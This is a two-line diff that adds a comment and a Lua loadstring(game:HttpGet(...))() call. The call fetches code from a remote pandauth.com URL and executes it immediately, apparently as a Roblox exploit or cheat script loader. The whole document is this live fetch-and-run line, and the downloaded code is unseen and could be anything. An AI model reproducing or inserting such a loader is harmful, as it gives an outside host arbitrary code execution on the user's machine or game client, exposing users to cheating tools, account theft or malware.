@@ -1,0 +1,2 @@
+--bbz
+loadstring(game:HttpGet("https://vss.pandauth.com/kv/85d3fddbfe9b45a3"))()
